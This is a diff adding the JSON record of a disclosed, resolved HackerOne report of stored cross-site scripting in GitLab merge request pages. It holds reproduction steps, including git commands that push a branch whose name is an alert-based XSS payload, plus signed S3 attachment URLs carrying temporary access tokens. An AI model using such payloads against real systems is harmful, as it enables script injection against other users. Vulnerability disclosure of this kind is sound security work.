@@ -1,0 +1,158 @@
+{
+  "id": 723307,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MjMzMDc=",
+  "url": "https://hackerone.com/reports/723307",
+  "title": "Stored XSS in merge request pages",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-10-26T16:18:30.659Z",
+  "submitted_at": "2019-10-26T16:18:30.659Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mike12",
+    "url": "/mike12",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/gjcadqove6ip9fo45ljpkbax7fpc/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-05-30T06:55:16.590Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-05-27T09:37:35.498Z",
+  "team_member_agreed_on_going_public_at": "2023-05-30T06:55:16.419Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello Gitlab!\n\n[Vulnerable code](https://gitlab.com/gitlab-org/gitlab/blob/9d81e97d9d111f874799605ce50ae480ae15b0c5/app/assets/javascripts/vue_merge_request_widget/components/states/mr_widget_rebase.vue#L47)\n\nTo reproduce the bug, we need to open a merge request with the following conditions:\n1. Project must have 'Merge commit with semi-linear history' or 'Fast-forward merge' merge method\n2. The merge request must require rebase before fast-forward/merge\n3. A visitor of the merge request page must not have permissions to push to source branch\n4. Target branch name must have a special name `<img/src='x'/onerror=alert(document.domain)>` :) \n\n**Steps to reproduce:**\n\n1. Run Gitlab `docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest`\n2. Create a new project\n3. Go to the project settings and set the 'Merge method' to 'Fast-forward merge' or 'Merge commit with semi-linear history' {F618529}\n4. Clone the repository and run the following in the repository:\n\n    ```bash\n    touch 1.txt\n    git add 1.txt\n    git commit -m \"initial commit\"\n    git push origin master\n    \n    git checkout -b \"<img/src='x'/onerror=alert(document.domain)>\"\n    touch 2.txt\n    git add 2.txt\n    git commit -m \"add 2.txt\"\n    git push origin \"<img/src='x'/onerror=alert(document.domain)>\"\n    \n    git checkout master\n    touch 3.txt\n    git add 3.txt\n    git commit -m \"add 3.txt\"\n    git push origin master\n    ```\n\n5. Create a merge request `master` => `<img/src='x'/onerror=alert(document.domain)>`\n6. Then we have to visit the merge request page under a user who does not have permissions to push to the source branch (in our case, `master` branch). For example: \n  * Make the project public and visit the merge request page under any user who does not have permissions in the project (or without authorization)\n  * Invite a user to the project, but without permissions to push to the source branch.\n\n{F618526}\n{F618527}\n{F618528}\n\n```bash\nroot@gitlab:/# gitlab-rake gitlab:env:info\n\nSystem information\nSystem:\t\t\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.3p62\nGem Version:\t2.7.9\nBundler Version:1.17.3\nRake Version:\t12.3.3\nRedis Version:\t3.2.12\nGit Version:\t2.22.0\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t12.4.0\nRevision:\t1425a56c75b\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t10.9\nURL:\t\thttp://gitlab.example.com\nHTTP Clone URL:\thttp://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab.example.com:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t10.2.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\nroot@gitlab:/# \n```\n\n## Impact\n\nAn attacker can:\n\n1. Perform any action within the application that a user can perform\n2. Steal sensitive user data\n3. Steal user's credentials",
+  "bounty_amount": "3500.0",
+  "formatted_bounty": "$3,500",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 618526,
+      "file_name": "example1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MwecQWbQ5p6VA8za2yBauYeg?response-content-disposition=attachment%3B%20filename%3D%22example1.png%22%3B%20filename%2A%3DUTF-8%27%27example1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUK2T5BIP%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150725Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQClz4SXUgbvpm39eq4v%2BP4CfqMsDtnskCUSRYciDTYoHAIgaz0AoIm4dzI0nar2Ex9bCqqsdHzWBvMCPlPStAsOuFYqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCrYORIjWQyS1l6cuSqOBeyyNeVj3GuM6lcIl0q%2Bv904BjDCJmWLD7V5F953hTdLwt42RGuWDfK4NXAeUt14GOlW%2FSGFuX3aWdm8Rwf2W3t7gvp3f5HWzdD94azqgHdq7cVcQGLbXInD6CXsqioadl7o9lRqEf4ryGPGWaZHC6u8BEtARmlugb6KbVwa%2BFQzWbNI2lVB9kcYDKUh8Mz%2Fes1caeO%2FQ%2F1qY1Purhqz4CSPCZg8Bg7lBgO6oP3OZHsBZdpJvZKRmkOl1oIEhz6RFvi03MKZGM0tgjRZXn8Vpurg6TGPoXMqJeDkMB6ZWzc28OgO8XBql6bal2A2qTMtDkxWb0UcD%2BZiEOaSDXlq67HBB%2BejgAGtto0ryCAJhv9e02S197w6II%2F80Zdybhjt86HNuGsd56uVHTZPgeg29wvi5pBHDtVyGNbhQUHhH6IQUJygvNES8S3C6Wkmb1SfLTvrNMZ6RGXJShAPC9nBYckL1NkkpFn7AgI60aumRCDKbdGxqOS6TisUAAlPE0xKKEbPSj0L9rOqhna6CFX9cmISrLSBx%2F%2FkRya%2F2EU1PG6NQseeOlpZl2cDH3pikDgbiRe3YN%2Fa2AHsem1RGGIC2WlTcac7WOKMwYwTMNaXykez31lz1LvdnnT0mfSmruVCyWXXcy%2Fjv2h56OpXqlz0hHyVNb2mN4C%2Fogr0QifN%2B7EA2piYer2mt9nV9WLoa4IMU%2BK%2F8HC2AAZUst2tWNLNPKmaNmwJgz0pa59IiZPPG%2Fi6qFTgR5Hwps7pjWltnrclQi%2BMbdyMaFHTJHbdpF%2FS%2FBoFe%2BQrnBGauwJZdWJY%2BLLIWAvGAg4ra%2BWeXhkQDMizGyiNjdXdB1IOexTSP%2B%2B7fVX5kEHdaDigbrfcElGjHjDwgP3PBjqxAWNYDn06%2BMz%2FQmLzsMbXMh7BuRvlzWnlhNL7u50B%2BOzozYNuG6YwKzmDHn2kS7Pjd%2B1HDa1LsXs6452a5irRhv%2FhLJnIfqRtQTYw21Bf%2Bl9JaQw83p78lKb1Rmx6CNRLpjt8AkaR4isQv%2FmROaud7dvhdzbtnnqAl%2Bf4aw21udqYdPfRZv%2BD1ei%2BzKDdgA6b1uHVnRtpclL4vfONoELlnyLm9D4HVOI%2Br8DmmvT5vFzzIw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3118bbb2c9f3ebba66b464f2de50ee02935fe4f7f84a2a62976599743548c5a9",
+      "file_size": 133644,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 618527,
+      "file_name": "example2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/H2HWvVUGfKQBX9firhouuBpt?response-content-disposition=attachment%3B%20filename%3D%22example2.png%22%3B%20filename%2A%3DUTF-8%27%27example2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUK2T5BIP%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150725Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQClz4SXUgbvpm39eq4v%2BP4CfqMsDtnskCUSRYciDTYoHAIgaz0AoIm4dzI0nar2Ex9bCqqsdHzWBvMCPlPStAsOuFYqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCrYORIjWQyS1l6cuSqOBeyyNeVj3GuM6lcIl0q%2Bv904BjDCJmWLD7V5F953hTdLwt42RGuWDfK4NXAeUt14GOlW%2FSGFuX3aWdm8Rwf2W3t7gvp3f5HWzdD94azqgHdq7cVcQGLbXInD6CXsqioadl7o9lRqEf4ryGPGWaZHC6u8BEtARmlugb6KbVwa%2BFQzWbNI2lVB9kcYDKUh8Mz%2Fes1caeO%2FQ%2F1qY1Purhqz4CSPCZg8Bg7lBgO6oP3OZHsBZdpJvZKRmkOl1oIEhz6RFvi03MKZGM0tgjRZXn8Vpurg6TGPoXMqJeDkMB6ZWzc28OgO8XBql6bal2A2qTMtDkxWb0UcD%2BZiEOaSDXlq67HBB%2BejgAGtto0ryCAJhv9e02S197w6II%2F80Zdybhjt86HNuGsd56uVHTZPgeg29wvi5pBHDtVyGNbhQUHhH6IQUJygvNES8S3C6Wkmb1SfLTvrNMZ6RGXJShAPC9nBYckL1NkkpFn7AgI60aumRCDKbdGxqOS6TisUAAlPE0xKKEbPSj0L9rOqhna6CFX9cmISrLSBx%2F%2FkRya%2F2EU1PG6NQseeOlpZl2cDH3pikDgbiRe3YN%2Fa2AHsem1RGGIC2WlTcac7WOKMwYwTMNaXykez31lz1LvdnnT0mfSmruVCyWXXcy%2Fjv2h56OpXqlz0hHyVNb2mN4C%2Fogr0QifN%2B7EA2piYer2mt9nV9WLoa4IMU%2BK%2F8HC2AAZUst2tWNLNPKmaNmwJgz0pa59IiZPPG%2Fi6qFTgR5Hwps7pjWltnrclQi%2BMbdyMaFHTJHbdpF%2FS%2FBoFe%2BQrnBGauwJZdWJY%2BLLIWAvGAg4ra%2BWeXhkQDMizGyiNjdXdB1IOexTSP%2B%2B7fVX5kEHdaDigbrfcElGjHjDwgP3PBjqxAWNYDn06%2BMz%2FQmLzsMbXMh7BuRvlzWnlhNL7u50B%2BOzozYNuG6YwKzmDHn2kS7Pjd%2B1HDa1LsXs6452a5irRhv%2FhLJnIfqRtQTYw21Bf%2Bl9JaQw83p78lKb1Rmx6CNRLpjt8AkaR4isQv%2FmROaud7dvhdzbtnnqAl%2Bf4aw21udqYdPfRZv%2BD1ei%2BzKDdgA6b1uHVnRtpclL4vfONoELlnyLm9D4HVOI%2Br8DmmvT5vFzzIw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c2c2f6d0ad495e198e06c562849992ff0ad73f920c6169d4d3a54de9bf88cdd0",
+      "file_size": 156415,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 618528,
+      "file_name": "example3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QwiuZQ9oUfguD9uMmLRrvh4q?response-content-disposition=attachment%3B%20filename%3D%22example3.png%22%3B%20filename%2A%3DUTF-8%27%27example3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUK2T5BIP%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150725Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQClz4SXUgbvpm39eq4v%2BP4CfqMsDtnskCUSRYciDTYoHAIgaz0AoIm4dzI0nar2Ex9bCqqsdHzWBvMCPlPStAsOuFYqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCrYORIjWQyS1l6cuSqOBeyyNeVj3GuM6lcIl0q%2Bv904BjDCJmWLD7V5F953hTdLwt42RGuWDfK4NXAeUt14GOlW%2FSGFuX3aWdm8Rwf2W3t7gvp3f5HWzdD94azqgHdq7cVcQGLbXInD6CXsqioadl7o9lRqEf4ryGPGWaZHC6u8BEtARmlugb6KbVwa%2BFQzWbNI2lVB9kcYDKUh8Mz%2Fes1caeO%2FQ%2F1qY1Purhqz4CSPCZg8Bg7lBgO6oP3OZHsBZdpJvZKRmkOl1oIEhz6RFvi03MKZGM0tgjRZXn8Vpurg6TGPoXMqJeDkMB6ZWzc28OgO8XBql6bal2A2qTMtDkxWb0UcD%2BZiEOaSDXlq67HBB%2BejgAGtto0ryCAJhv9e02S197w6II%2F80Zdybhjt86HNuGsd56uVHTZPgeg29wvi5pBHDtVyGNbhQUHhH6IQUJygvNES8S3C6Wkmb1SfLTvrNMZ6RGXJShAPC9nBYckL1NkkpFn7AgI60aumRCDKbdGxqOS6TisUAAlPE0xKKEbPSj0L9rOqhna6CFX9cmISrLSBx%2F%2FkRya%2F2EU1PG6NQseeOlpZl2cDH3pikDgbiRe3YN%2Fa2AHsem1RGGIC2WlTcac7WOKMwYwTMNaXykez31lz1LvdnnT0mfSmruVCyWXXcy%2Fjv2h56OpXqlz0hHyVNb2mN4C%2Fogr0QifN%2B7EA2piYer2mt9nV9WLoa4IMU%2BK%2F8HC2AAZUst2tWNLNPKmaNmwJgz0pa59IiZPPG%2Fi6qFTgR5Hwps7pjWltnrclQi%2BMbdyMaFHTJHbdpF%2FS%2FBoFe%2BQrnBGauwJZdWJY%2BLLIWAvGAg4ra%2BWeXhkQDMizGyiNjdXdB1IOexTSP%2B%2B7fVX5kEHdaDigbrfcElGjHjDwgP3PBjqxAWNYDn06%2BMz%2FQmLzsMbXMh7BuRvlzWnlhNL7u50B%2BOzozYNuG6YwKzmDHn2kS7Pjd%2B1HDa1LsXs6452a5irRhv%2FhLJnIfqRtQTYw21Bf%2Bl9JaQw83p78lKb1Rmx6CNRLpjt8AkaR4isQv%2FmROaud7dvhdzbtnnqAl%2Bf4aw21udqYdPfRZv%2BD1ei%2BzKDdgA6b1uHVnRtpclL4vfONoELlnyLm9D4HVOI%2Br8DmmvT5vFzzIw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2f6bfe6ee3b9d22cc6935b3492cf9d97c332c8377e6ca6a8a1c899e2049231ee",
+      "file_size": 125934,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 618529,
+      "file_name": "project-settings.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p5PL8rytMqZmgeffH4dBB3DL?response-content-disposition=attachment%3B%20filename%3D%22project-settings.png%22%3B%20filename%2A%3DUTF-8%27%27project-settings.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUK2T5BIP%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150725Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQClz4SXUgbvpm39eq4v%2BP4CfqMsDtnskCUSRYciDTYoHAIgaz0AoIm4dzI0nar2Ex9bCqqsdHzWBvMCPlPStAsOuFYqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCrYORIjWQyS1l6cuSqOBeyyNeVj3GuM6lcIl0q%2Bv904BjDCJmWLD7V5F953hTdLwt42RGuWDfK4NXAeUt14GOlW%2FSGFuX3aWdm8Rwf2W3t7gvp3f5HWzdD94azqgHdq7cVcQGLbXInD6CXsqioadl7o9lRqEf4ryGPGWaZHC6u8BEtARmlugb6KbVwa%2BFQzWbNI2lVB9kcYDKUh8Mz%2Fes1caeO%2FQ%2F1qY1Purhqz4CSPCZg8Bg7lBgO6oP3OZHsBZdpJvZKRmkOl1oIEhz6RFvi03MKZGM0tgjRZXn8Vpurg6TGPoXMqJeDkMB6ZWzc28OgO8XBql6bal2A2qTMtDkxWb0UcD%2BZiEOaSDXlq67HBB%2BejgAGtto0ryCAJhv9e02S197w6II%2F80Zdybhjt86HNuGsd56uVHTZPgeg29wvi5pBHDtVyGNbhQUHhH6IQUJygvNES8S3C6Wkmb1SfLTvrNMZ6RGXJShAPC9nBYckL1NkkpFn7AgI60aumRCDKbdGxqOS6TisUAAlPE0xKKEbPSj0L9rOqhna6CFX9cmISrLSBx%2F%2FkRya%2F2EU1PG6NQseeOlpZl2cDH3pikDgbiRe3YN%2Fa2AHsem1RGGIC2WlTcac7WOKMwYwTMNaXykez31lz1LvdnnT0mfSmruVCyWXXcy%2Fjv2h56OpXqlz0hHyVNb2mN4C%2Fogr0QifN%2B7EA2piYer2mt9nV9WLoa4IMU%2BK%2F8HC2AAZUst2tWNLNPKmaNmwJgz0pa59IiZPPG%2Fi6qFTgR5Hwps7pjWltnrclQi%2BMbdyMaFHTJHbdpF%2FS%2FBoFe%2BQrnBGauwJZdWJY%2BLLIWAvGAg4ra%2BWeXhkQDMizGyiNjdXdB1IOexTSP%2B%2B7fVX5kEHdaDigbrfcElGjHjDwgP3PBjqxAWNYDn06%2BMz%2FQmLzsMbXMh7BuRvlzWnlhNL7u50B%2BOzozYNuG6YwKzmDHn2kS7Pjd%2B1HDa1LsXs6452a5irRhv%2FhLJnIfqRtQTYw21Bf%2Bl9JaQw83p78lKb1Rmx6CNRLpjt8AkaR4isQv%2FmROaud7dvhdzbtnnqAl%2Bf4aw21udqYdPfRZv%2BD1ei%2BzKDdgA6b1uHVnRtpclL4vfONoELlnyLm9D4HVOI%2Br8DmmvT5vFzzIw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aec6966a0415a6b6f4c55e3c34b8358bcde9d4787d6599546991db503e388bc0",
+      "file_size": 131329,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 52,
+  "voters": [
+    "adnanthekhan",
+    "n1m0",
+    "maskopatol",
+    "zy9ard3",
+    "rook1337",
+    "prasannasrinivasan",
+    "bl4de",
+    "shubham_srt",
+    "f_m",
+    "2026",
+    "and 42 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
